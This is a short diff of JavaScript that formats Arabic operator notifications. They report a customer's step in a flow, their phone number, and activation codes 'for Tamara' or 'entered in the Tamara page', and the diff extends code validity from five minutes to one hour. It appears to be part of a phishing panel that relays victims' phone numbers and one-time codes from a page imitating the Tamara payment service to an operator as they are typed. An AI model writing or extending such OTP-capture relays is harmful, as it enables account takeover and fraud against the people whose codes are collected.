@@ -295,9 +295,9 @@ const sendActivationCode = async (event, activationCode) => {
   text += '📍 العميل الآن في: صفحة إدخال رقم الهاتف\n\n';
 
   text += `👤 العميل: ${userName || '—'}\n`;
-  text += `📱 الرقم: ${phoneNumber || '—'}\n`;
-  text += `🔢 الكود: <code>${activationCode}</code>\n\n`;
-  text += `⏰ صلاحية الكود: 5 دقائق\n`;
+  text += `📱 رقم الزبون: ${phoneNumber || '—'}\n`;
+  text += `🔢 الكود لتمارا: <code>${activationCode}</code>\n\n`;
+  text += `⏰ صلاحية الكود: 1 ساعه\n`;
   text += '\n';
   text += `🆔 Session: ${sessionShort}...\n`;
   text += `📅 ${formatDate(new Date())}\n`;
@@ -412,7 +412,7 @@ const sendActivationCodeEnteredNotification = async (sessionId, phoneNumber, cod
   text += '━━━━━━━━━━━━━━━━━━━━\n\n';
   text += '📍 العميل الآن في: صفحة إدخال كود التفعيل\n\n';
   text += `📱 رقم الهاتف: ${phoneNumber || '—'}\n`;
-  text += `🔑 الكود المدخل: <code>${code || '—'}</code>\n\n`;
+  text += `🔑 الكود المدخل في صفحه تمارا: <code>${code || '—'}</code>\n\n`;
   text += `🆔 Session: ${sessionShort}...\n`;
   text += `📅 ${formatDate(new Date())}\n`;
 
